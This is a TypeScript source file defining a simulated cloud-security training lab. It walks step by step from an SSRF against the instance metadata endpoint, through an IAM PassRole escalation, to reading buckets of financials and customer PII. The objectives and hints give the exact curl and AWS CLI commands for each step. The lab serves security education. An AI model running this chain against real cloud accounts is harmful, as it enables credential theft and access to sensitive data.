import { dir } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker() {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir({}) }) };
}

/** Cloud module capstone: one continuous five-flag chain from an SSRF against instance metadata, through
 *  an IAM PassRole misconfiguration, to full-account-level S3 access — instead of separate isolated Cloud
 *  labs. Every mechanic (curl+vulnRoutes SSRF, export/aws sts/aws s3/aws iam/aws ec2) is already
 *  established elsewhere on this platform, using the real AWS CLI command surface throughout. */
export const cloudCapstoneLabs: LabScenario[] = [
  {
    id: 'cloud-capstone-ssrf-metadata-to-passrole-account-takeover',
    title: 'Capstone: SSRF Metadata Theft to Full-Account IAM PassRole Takeover',
    difficulty: 'Hard',
    category: 'Cloud',
    briefing:
      "Meridian Analytics's internal reporting dashboard performs a genuine server-side fetch of whatever " +
      "URL a data-source field is given — the same SSRF-to-instance-metadata theft covered elsewhere on this " +
      "platform, except this time the stolen role's read-only S3 access is only the beginning. A staging " +
      "bucket that role CAN read holds deployment notes documenting a far more dangerous permission the same " +
      "role was never audited for: iam:PassRole against a role with full AdministratorAccess. Chain the SSRF " +
      "all the way through that misconfiguration to prove exactly what it grants.",
    objectives: [
      {
        text: 'nmap -sV 10.10.210.5 to confirm the dashboard service and capture the first flag',
        why: 'Confirming exactly what is running before probing it is standard recon discipline, and the version banner here already confirms the service is reachable and worth testing.',
      },
      {
        text: 'curl "http://10.10.210.5/dashboard/datasource?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/reporting-role" and capture the second flag',
        why: 'The exact same instance-metadata SSRF technique from this module\'s earlier lesson, reached through a different feature — this leaks a live, temporary AccessKeyId for the reporting-role.',
      },
      {
        text: 'export AWS_ACCESS_KEY_ID=<leaked-key>, confirm with aws sts get-caller-identity, then aws s3 ls s3://meridian-staging-artifacts/ and aws s3 cp the notes file it lists — capture the third flag',
        why: "The stolen role's own read-only bucket access is what reveals the actual escalation path — real operators (and real attackers) always enumerate what a stolen credential can reach before assuming its blast radius is limited to what it was intended for.",
      },
      {
        text: 'aws iam list-attached-role-policies --role-name admin-deploy-role to confirm the target role\'s actual privilege level',
        why: 'Confirming the target role genuinely holds AdministratorAccess before attempting to pass it is the same validate-before-escalate discipline taught throughout this platform\'s other privilege-escalation labs.',
      },
      {
        text: 'aws ec2 run-instances --iam-instance-profile Name=admin-deploy-role ... to pass the over-permissioned role to a new instance',
        why: 'iam:PassRole is easy to grant casually ("this role just needs to launch instances") and easy to forget carries the power of whatever role it is allowed to pass — here, that is every permission AdministratorAccess grants.',
      },
      {
        text: 'export AWS_ACCESS_KEY_ID=<admin-deploy-role key from the previous step>, then aws s3 ls/cp both s3://meridian-crown-jewels-financials/ and s3://meridian-crown-jewels-pii/ — capture the fourth and fifth flags',
        why: 'This is the full, reportable impact chain: a browser-facing SSRF, followed four steps, ends in unrestricted access to every S3 bucket in the account — the actual finding a real cloud security assessment would lead with.',
      },
    ],
    hints: [
      'nmap -sV 10.10.210.5',
      'curl "http://10.10.210.5/dashboard/datasource?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/reporting-role"',
      'export AWS_ACCESS_KEY_ID=AKIA-SIM-MERID-REPORT',
      'aws sts get-caller-identity',
      'aws s3 ls s3://meridian-staging-artifacts/',
      'aws s3 cp s3://meridian-staging-artifacts/deploy-notes.txt -',
      'aws iam list-attached-role-policies --role-name admin-deploy-role',
      'aws ec2 run-instances --iam-instance-profile Name=admin-deploy-role --image-id ami-0abcd1234',
      'export AWS_ACCESS_KEY_ID=AKIA-SIM-MERID-ADMIN',
      'aws s3 ls s3://meridian-crown-jewels-financials/',
      'aws s3 cp s3://meridian-crown-jewels-financials/full-financials.csv -',
      'aws s3 ls s3://meridian-crown-jewels-pii/',
      'aws s3 cp s3://meridian-crown-jewels-pii/customer-export.csv -',
    ],
    totalFlags: 5,
    attacker: attacker(),
    network: [
      {
        hostname: 'reporting-dashboard-02',
        ip: '10.10.210.5',
        os: 'Cloud VM (IAM instance role attached)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0 (reporting dashboard, server-side data-source fetch enabled — flag{cloud_dashboard_ssrf_vulnerable_service_confirmed})',
            http: {},
            vulnRoutes: [
              {
                kind: 'ssrf',
                path: '/dashboard/datasource',
                param: 'url',
                triggerSubstrings: ['169.254.169.254', 'metadata', 'localhost', '127.0.0.1'],
                vulnerableResponse:
                  '{"AccessKeyId":"AKIA-SIM-MERID-REPORT","SecretAccessKey":"REDACTED-VIA-SSRF","Role":"reporting-role","flag":"flag{ssrf_leaks_reporting_role_iam_credentials}"}',
                normalResponse: '{"status":"ok","rows":8}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
        awsAccount: {
          accountId: '778821049933',
          roles: [
            { name: 'reporting-role', policySummary: 'AmazonS3ReadOnlyAccess (scoped to meridian-staging-artifacts)' },
            { name: 'admin-deploy-role', policySummary: 'AdministratorAccess (full account access — never scoped down after initial setup)', passableBy: ['reporting-role'] },
          ],
          credentials: [
            { accessKeyId: 'AKIA-SIM-MERID-REPORT', secretAccessKey: 'REDACTED-VIA-SSRF', role: 'reporting-role', accountId: '778821049933', arn: 'arn:aws:sts::778821049933:assumed-role/reporting-role/i-0aaa111bbb222ccc' },
            { accessKeyId: 'AKIA-SIM-MERID-ADMIN', secretAccessKey: 'REDACTED-VIA-PASSROLE', role: 'admin-deploy-role', accountId: '778821049933', arn: 'arn:aws:sts::778821049933:assumed-role/admin-deploy-role/i-0new9988' },
          ],
          buckets: [
            {
              name: 'meridian-staging-artifacts',
              requiredRole: 'reporting-role',
              objects: [
                {
                  key: 'deploy-notes.txt',
                  content:
                    "reporting-role was granted iam:PassRole against admin-deploy-role (AdministratorAccess) to let this\n" +
                    'automation launch its own EC2 instances — nobody realized what that permission actually allows.\n' +
                    'flag{staging_bucket_notes_reveal_iam_passrole_misconfiguration}\n',
                },
              ],
            },
            {
              name: 'meridian-crown-jewels-financials',
              requiredRole: 'admin-deploy-role',
              objects: [
                {
                  key: 'full-financials.csv',
                  content: 'quarter,revenue,notes\nQ2-2026,9840000,internal export\nflag{passrole_escalation_reaches_full_financials_bucket}\n',
                },
              ],
            },
            {
              name: 'meridian-crown-jewels-pii',
              requiredRole: 'admin-deploy-role',
              objects: [
                {
                  key: 'customer-export.csv',
                  content: 'customer_id,name,email\n90211,REDACTED,REDACTED\nflag{passrole_escalation_reaches_full_customer_pii_bucket}\n',
                },
              ],
            },
          ],
        },
      } as HostDef,
    ],
  },
];
